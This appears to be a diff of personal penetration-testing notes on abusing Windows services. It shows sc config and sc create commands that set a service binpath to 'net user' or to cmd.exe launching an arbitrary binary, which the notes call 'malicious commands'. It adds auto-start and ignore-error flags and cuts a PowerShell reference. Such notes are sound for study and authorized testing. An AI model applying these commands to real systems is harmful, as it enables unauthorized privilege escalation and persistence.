@@ -9,22 +9,14 @@ sc config &lt;service&gt;&#09;ex: sc config &lt;service&gt; binpath= "net user r
 sc create &lt;servicename&gt; binpath= “c:\windows\system32\cmd.exe /k &lt;pathtobinaryexecutable&gt;” DisplayName= &lt;displayname&gt;<br/>
 sc start &lt;servicename&gt;<br/>
 <br/>
+Other flags<br/>
+start= auto <br/>
+error= ignore<br/>
+<br/>
+<br/>
 #The sc utility throws an error each time we start the service with one of our malicious commands in the binpath. &nbsp;This is because the net user and net localgroup commands do not point to the service binary and therefore the SCM cannot communicate with the service. &nbsp;Never fear, however, as the error is thrown only after issuing our malicious commands.<br/>
 <br/>
 Easy way around this is to have cmd.exe /k &lt;pathtoexe&gt;. The cmd.exe shell will close, but your second launched process will continue to run. <br/>
 <br/>
-Powershell<br/>
-PS&gt; Get-Service -Name &lt;name&gt;<br/>
-Start-Service<br/>
-Stop-Service<br/>
-Restart-Service<br/>
 <br/>
-And you have access to view properties of service<br/>
-<br/>
-$service = Get-Service -Name &lt;name&gt;<br/>
-$service.&lt;name/displayname/type/starttype/etc&gt;<br/>
-<br/>
-Powershell Setting services<br/>
-Set-Service [-Name] &lt;string&gt; [-Description &lt;string&gt;] [-DisplayName &lt;string&gt;] [-PassThru] [-StartupType {&lt;Automatic&gt; | &lt;Manual&gt; | &lt;Disabled&gt;}] [-Status &lt;string&gt;] [-ComputerName &lt;string[]&gt;] [-Confirm] [-WhatIf] [&lt;CommonParameters&gt;]<br/>
-<br/>
-Set-Service [-Description &lt;string&gt;] [-DisplayName &lt;string&gt;] [-InputObject &lt;ServiceController&gt;] [-PassThru] [-StartupType {&lt;Automatic&gt; | &lt;Manual&gt; | &lt;Disabled&gt;}] [-Status &lt;string&gt;] [-ComputerName &lt;string[]&gt;] [-Confirm] [-WhatIf] [&lt;CommonParameters&gt;]</body></html>
+See Powershell section for managing services in PowerShell</body></html>
